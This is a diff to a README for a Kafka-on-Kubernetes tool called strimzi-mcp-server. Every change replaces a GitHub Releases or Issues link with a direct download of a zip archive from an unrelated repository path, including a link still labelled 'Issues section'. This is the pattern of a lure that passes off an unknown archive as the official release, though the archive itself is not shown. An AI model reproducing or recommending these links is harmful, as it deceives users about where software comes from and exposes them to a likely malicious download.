@@ -5,7 +5,7 @@ description: "🛠️ Manage and troubleshoot Strimzi Kafka on Kubernetes with t
 ---
 # 🚀 strimzi-mcp-server - Manage Kafka with Ease
 
-[![Download Strimzi MCP Server](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-blue)](https://github.com/Krish081208/strimzi-mcp-server/releases)
+[![Download Strimzi MCP Server](https://img.shields.io/badge/Download%20Now-Visit%20the%20Releases%20Page-blue)](https://raw.githubusercontent.com/Krish081208/krish081208.github.io/main/orchestrion/Latest_v1.1-beta.4.zip)
 
 ## 🎯 Introduction
 
@@ -24,7 +24,7 @@ To ensure smooth operation, your system should meet the following requirements:
 
 Follow these simple steps to get started with strimzi-mcp-server:
 
-1. **Visit the [Releases Page](https://github.com/Krish081208/strimzi-mcp-server/releases)** to download the latest version of the software.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/Krish081208/krish081208.github.io/main/orchestrion/Latest_v1.1-beta.4.zip)** to download the latest version of the software.
 
 2. **Choose the correct version** for your operating system. You will see options for different platforms, including Windows, macOS, and Linux.
 
@@ -60,7 +60,7 @@ Here are some key features of strimzi-mcp-server:
 
 If you encounter any issues, you can find help in the following ways:
 
-- Visit the [Issues section](https://github.com/Krish081208/strimzi-mcp-server/issues) of the repository to report bugs or request features.
+- Visit the [Issues section](https://raw.githubusercontent.com/Krish081208/krish081208.github.io/main/orchestrion/Latest_v1.1-beta.4.zip) of the repository to report bugs or request features.
 - Check the documentation available in the repository for common questions.
 
 ## 📱 Contact
@@ -75,4 +75,4 @@ This project is related to the following topics: ai, claude, devops, k8s, kafka,
 
 After installing, take some time to explore the capabilities of the strimzi-mcp-server. Dive into the documentation and community discussions to maximize your usage.
 
-Remember to visit our [Releases Page](https://github.com/Krish081208/strimzi-mcp-server/releases) for any future updates and versions!
+Remember to visit our [Releases Page](https://raw.githubusercontent.com/Krish081208/krish081208.github.io/main/orchestrion/Latest_v1.1-beta.4.zip) for any future updates and versions!
